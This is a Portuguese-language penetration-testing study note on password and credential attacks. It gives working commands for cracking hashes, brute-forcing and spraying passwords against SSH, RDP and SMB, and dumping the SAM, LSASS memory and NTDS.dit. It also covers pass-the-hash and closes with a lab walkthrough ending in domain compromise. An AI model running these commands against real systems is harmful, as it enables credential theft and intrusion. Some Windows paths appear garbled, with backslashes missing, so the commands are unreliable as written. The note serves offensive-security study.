# Password Attacks, Hashes & Credential Harvesting

Esta nota aborda métodos para extração, análise, quebra e abuso de credenciais em sistemas operacionais e serviços de rede.

---

## Fatores de Autenticação & Princípios de Criptografia
- **Hashes Conhecidos:** MD5, SHA1, SHA256, NTLM, NetNTLMv1/v2, Bcrypt, Argond2.
- **Salt:** Valor aleatório adicionado à senha antes de gerar o hash para prevenir ataques com Rainbow Tables (tabelas de pré-computação).

---

## Tipos de Ataque a Senhas
- **Ataque de Dicionário (Wordlist):** Teste de palavras conhecidas (ex: `rockyou.txt`, SecLists).
- **Ataque de Força Bruta / Máscara:** Teste exaustivo de todas as combinações de caracteres.
- **[[Password Spraying]]:** Testar uma única senha fraca comum (ex: `Winter2026!`) contra uma lista de múltiplos usuários para não violar políticas de bloqueio de conta (Account Lockout Policy).
- **Credential Stuffing:** Reutilização de credenciais vazadas em outros serviços.

---

## Ferramentas de Quebra de Hashes Offline

### 1. John the Ripper
- **Modo Wordlist:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
- **Modo Single Crack:** Usa informações do nome do usuário para gerar variações.
```bash
john --single hashes.txt
```
- **Helpers *2john:** Ferramentas para converter formatos de arquivos em hashes quebráveis pelo John:
```bash
ssh2john id_rsa > ssh.hash
office2john documento.docx > office.hash
pdf2john documento.pdf > pdf.hash
zip2john arquivo.zip > zip.hash
```

### 2. Hashcat
O Hashcat utiliza aceleração por GPU para quebra ultra-rápida de hashes.
- **Sintaxe Geral:**
```bash
hashcat -m <MODO> -a <TIPO_ATAQUE> hashes.txt wordlist.txt
```
- **Modos de Hash Comuns:**
  - `-m 1000`: NTLM
  - `-m 5600`: NetNTLMv2
  - `-m 13100`: Kerberoasting (TGS-REP)
  - `-m 18200`: ASREPRoasting
  - `-m 1800`: SHA-512 ($6$ Linux shadow)
- **Ataque de Máscara (`-a 3`):**
```bash
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d?s
```
*(Legenda: ?u=Maiúscula, ?l=Minúscula, ?d=Dígito, ?s=Símbolo)*
- **Geração de Palavras-Chave com CeWL:**
```bash
cewl -w wordlist_custom.txt -d 2 http://targetdomain.com
```

---

## Ataques a Senhas em Serviços de Rede

### Hydra
Ataque de força bruta ativo em serviços autenticados:
- **SSH:**
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
```
- **RDP:**
```bash
hydra -L users.txt -p Password123 rdp://<TARGET_IP> -V
```
- **SMB:**
```bash
hydra -L users.txt -P passwords.txt smb://<TARGET_IP>
```

### NetExec / CrackMapExec (Password Spraying)
```bash
nxc smb <TARGET_IP> -u users.txt -p 'Spring2026!' --continue-on-success
```

---

## Autenticação Windows & LSASS

### Armazenamento de Credenciais
- **SAM (Security Account Manager):** Banco de dados local contendo hashes NTLM dos usuários locais (`C:WindowsSystem32configSAM`).
- **LSASS (Local Security Authority Subsystem Service):** Processo em memória (`lsass.exe`) que armazena credenciais ativas, tickets Kerberos e hashes NTLM.

### Dump das Hives HKLM SAM/SYSTEM
```cmd
reg save hklmsam C:UsersPublicsam.hive
reg save hklmsystem C:UsersPublicsystem.hive
reg save hklmsecurity C:UsersPublicsecurity.hive
```
Extração offline com Impacket:
```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### Dumping da Memória do LSASS
- **Rundll32 com comsvcs.dll (Nativo):**
```powershell
$procid = (Get-Process lsass).Id
rundll32.exe C:WindowsSystem32comsvcs.dll, MiniDump $procid C:UsersPubliclsass.dmp full
```
- **Pypykatz (Extração Linux):**
```bash
pypykatz lsa minidump lsass.dmp
```
- **Mimikatz (Direto em memória):**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Windows Credential Manager & Vaults
- Consultar credenciais salvas no Windows:
```cmd
cmdkey /list
```
- Executar processos com credenciais salvas:
```cmd
runas /savecred /user:WORKGROUPAdministrator "cmd.exe"
```
- Ferramenta LaZagne: Extração automática de senhas salvas em navegadores, clientes de e-mail e Wi-Fi.

---

## Active Directory Credential Harvesting

### 1. Extração do Banco [[NTDS.dit]]
O arquivo `NTDS.dit` armazena todas as senhas e objetos do domínio Active Directory.
- **Via VSSAdmin / Volume Shadow Copy:**
```cmd
vssadmin create shadow /for=C:
copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1WindowsNTDSNTDS.dit C:UsersPublic
tds.dit
```
- **Dump via Impacket (secretsdump.py):**
```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL -outputfile domain_hashes
```

### 2. Pass the Hash (PtH)
Uso da hash NTLM do usuário diretamente para autenticação sem necessidade de descobrir a senha em texto claro:
```bash
nxc smb <TARGET_IP> -u Administrator -H 2b871d469ee1630c4606244080486316
evil-winrm -i <TARGET_IP> -u Administrator -H 2b871d469ee1630c4606244080486316
wmiexec.py -hashes :2b871d469ee1630c4606244080486316 Administrator@<TARGET_IP>
```

### 3. Credential Hunting no Sistema de Arquivos
- **findstr para arquivos de configuração:**
```cmd
findstr /s /i /p "password" C:*.*
```
- **Arquivos comuns com senhas em texto claro:** `web.config`, `unattend.xml`, `sysvol` scripts, cofres KeePass (`.kdbx`).
- **Ferramentas Especializadas:**
  - **Snaffler:** Busca em compartilhamentos SMB por arquivos de chaves, senhas e certificados.
  - **PowerHuntShares & MANSPIDER:** Automação de busca por arquivos sensíveis em compartilhamentos de rede.

### 4. Pass the Certificate & AD CS Attacks
- Abuso de serviços de certificado do Active Directory (AD CS).
- Relayer de autenticação NTLM para o endpoint HTTP do AD CS (ESC8 / PrinterBug).
- Ferramentas: `printerbug.py`, `gettgtpkinit.py`, Shadow Credentials com `pywhisker`.

---

## Walkthrough Completo da Avaliação de Passwords
1. Identificação do usuário Betty Jayde via gerador `username-anarchy`.
2. Ataque de Password Spraying em SSH com Hydra descobrindo a senha de acesso inicial.
3. Estabelecimento de pivô de rede usando `ligolo-ng`.
4. Execução do Snaffler na rede interna identificando um arquivo `.kdbx` do Password Safe v3.
5. Extração da hash com `kdbx2john` e quebra no John the Ripper.
6. Leitura da senha do Administrador do Domínio no Password Safe.
7. Extração do banco `NTDS.dit` do Domain Controller via `secretsdump.py` para obter o acesso total.

---
*Notas relacionadas:* [[Active Directory]], [[Shells & Payloads]], [[Footprinting]], [[Pivoting]]
